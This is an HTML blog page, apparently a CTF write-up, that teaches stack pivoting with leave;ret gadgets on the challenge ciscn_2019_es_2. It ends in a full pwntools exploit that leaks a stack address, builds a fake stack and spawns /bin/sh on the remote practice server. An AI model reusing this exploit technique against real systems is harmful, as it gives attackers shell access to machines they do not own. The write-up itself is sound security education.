@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>栈迁移 - Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）
+适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。
+概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。
+原理 leave &amp; ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp&#43;4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip
+两次 leave&amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="栈迁移" />
+<meta property="og:description" content="参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）
+适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。
+概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。
+原理 leave &amp; ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp&#43;4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip
+两次 leave&amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-06-22T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="栈迁移"/>
+<meta name="twitter:description" content="参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）
+适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。
+概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。
+原理 leave &amp; ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp&#43;4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip
+两次 leave&amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。"/>
+
+	
+        <link href="https://example.com/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://example.com/css/main.d902908ac6e0fab67957de5db5aea1b6455b19ae2ca98eac4c95a4a0fdc02238.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://example.com/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css" media="(prefers-color-scheme: dark)"  />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://example.com">Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/categories">Categories</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/about">About</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">栈迁移</h1>
+			<div class="meta">Posted on Jun 22, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<p>参考：<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)</a>（这篇写的及其详细）</p>
+<h2 id="适用场景">适用场景</h2>
+<p>当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。</p>
+<h2 id="概述">概述</h2>
+<p>栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。
+那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。
+想要修改 esp 和 ebp 的值，我们需要用到 <code>leave</code> 和 <code>ret</code> 两个 gadget。</p>
+<h2 id="原理">原理</h2>
+<h3 id="leave--ret">leave &amp; ret</h3>
+<p><code>leave</code> 命令由两句汇编指令组成：<strong>mov esp, ebp</strong>和<strong>pop ebp</strong>
+它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。<strong>操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp</strong>
+<code>ret</code> 命令是 <strong>pop rip</strong>
+将栈顶的值弹给 rip</p>
+<h2 id="两次-leaveret">两次 leave&amp;ret</h2>
+<p>我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。</p>
+<ul>
+<li>首先我们对栈进行覆盖，将此时 ebp 指向的位置（也就是上一个栈帧的 ebp）覆盖为栈迁移的目的地址 a（未来 esp 中的值），return 位置覆盖为 leave&amp;ret 的地址。</li>
+<li>然后程序开始执行，因为当前函数执行结束时本来就要执行一个 leave&amp;ret，所以进行<strong>mov esp, ebp</strong>和<strong>pop ebp</strong>，此时 esp 中的值正常，ebp 的值变为目标地址 a（因为将栈上的地址弹到 ebp 了）</li>
+<li>接着执行 ret（pop rip），因为此时 return 的值被我们覆盖为 leave&amp;ret 的地址，所以程序会再次执行一次 leave&amp;ret。leave 执行结束后，esp 中的值是目标地址 a+4（因为还 pop ebp 了一次），ebp 的值无所谓。接着执行 ret，执行结束后 rip 的值是目标地址 a+4 中的值。</li>
+<li>迁移成功。</li>
+</ul>
+<p>此时，可能就会存在疑问，所以呢？迁移结束了又能怎样。实际上栈迁移只是我们攻击的一个步骤，目的就是将程序的执行流劫持到目标地址 a 处（在上面的步骤中实际上应该是 a+4 处，但是我只是说这么个意思，无伤大雅）。在栈迁移之前，我们已经将目标地址处覆盖为了我们要执行的代码的地址，并且构造了 ROP 链，这样就可以实现我们的攻击了。</p>
+<h2 id="例题">例题</h2>
+<p>ciscn_2019_es_2
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230503100937.png" alt="image.png">
+这个题的 read 函数写死了读入 0x30 个字符，我们可以看到变量 s 距离 ebp 是 0x28 个字节，所以按照普通的方法，我们构造 payload 是 (0x28 + 4) * &lsquo;a&rsquo; + ret_addr，这已经 0x30 个字符了，根本不够用。
+所以我们考虑栈迁移</p>
+<h3 id="step-1-寻找目标地址">step 1 寻找目标地址</h3>
+<p>我们要确定目标地址是哪里，这个题中我们可以将 s 作为目标地址。那么我们需要知道 s 确切的地址。
+如何获得 s 的地址呢，我们观察一下 vlu 函数的栈：</p>
+<ul>
+<li>打开 gdb，在 main 函数处下断点，找一下 vul 函数的地址
+<ul>
+<li><img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230503102227.png" alt="image.png"></li>
+</ul>
+</li>
+<li>在 vul 函数处下断点，然后单步步入，进入函数 vul
+<ul>
+<li><img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230503102337.png" alt="image.png"></li>
+<li>查看一下 vul 的汇编 <img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230503102438.png" alt="image.png"></li>
+</ul>
+</li>
+<li>因为我们想要知道 s 的地址，所以我们先输入字符‘aaaa’，然后看看栈中的情况
+<ul>
+<li>在 printf 函数前打个断点，因为要先执行一个 read 函数输入‘aaaa’</li>
+<li><img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230503102816.png" alt="image.png"></li>
+<li>我们观察栈中的情况，eax 和 ecx 指向的地方就是 s 的地址，但是这个地址是我们本地地址，你要打远程主机不能用这个。所以我们要想方法暴露一个栈上的地址 x，然后算 x 和 s 的偏移 y，那么 s 的地址就是 x+y。</li>
+<li>我们可以看到 ebp 指向的地方存了一个地址 0xffffd 008，这是上一个栈帧的 ebp，它距离 s 的地址的偏移是 56。那么如果可以将它暴露，就可以求得 s 的地址了。</li>
+</ul>
+</li>
+<li>程序中有 printf 函数，该函数在未遇到终止符 &lsquo;\0&rsquo;时会一直输出，那么我们可以利用 printf 将栈上的值输出，得到 ebp 指向的值。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>, <span style="color:#ae81ff">26588</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x27</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload1) <span style="color:#75715e"># sendline会有终止符</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;b&#39;</span>)
+</span></span><span style="display:flex;"><span>s_addr <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>print(hex(s_addr))
+</span></span></code></pre></div><p><img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230503104244.png" alt="image.png"></p>
+<h3 id="step-2-构造-payload">step 2 构造 payload</h3>
+<p>要实现栈迁移，只要把 ebp 和 return 位置覆盖为目标地址和 leave&amp;ret 地址就 ok 了。那么迁移后的 fake 栈上应该如何布局呢。
+程序中有 system 函数，但是没有 bin/sh 字符串。那么 fake 栈应该这样布局：
+system_addr + fake_ret + bin_sh_addr + bin_sh_str
+综上所述，最终的 payload 应该是
+‘aaaa’ + system_addr + fake_ret + bin_sh_addr + bin_sh_str + padding + s_addr + leave&amp;ret_addr
+最前面的 4 个字节的 aaaa 是为了抵消掉 leave 指令中 pop ebp 导致的 esp 上移，中间的 padding 是为了补全 0x28 个字节。
+完整的 exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>, <span style="color:#ae81ff">26588</span>)
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x27</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload1) <span style="color:#75715e"># sendline会有终止符</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;b&#39;</span>)
+</span></span><span style="display:flex;"><span>s_addr <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;s_addr: &#39;</span>, hex(s_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048400</span>
+</span></span><span style="display:flex;"><span>leave_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080484b8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaa&#39;</span> <span style="color:#f92672">+</span> p32(system_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaa&#39;</span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> payload2 <span style="color:#f92672">+</span> p32(s_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> payload2 <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> payload2<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> payload2 <span style="color:#f92672">+</span> p32(s_addr) <span style="color:#f92672">+</span> p32(leave_ret)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload2)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>注意 payload2 中 bin/sh 字符串要加终止符</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9">PWN知识点</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"></div>
+  <div class="footer-info">
+    2023  © Athul |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+</div>
+    </body>
+</html>
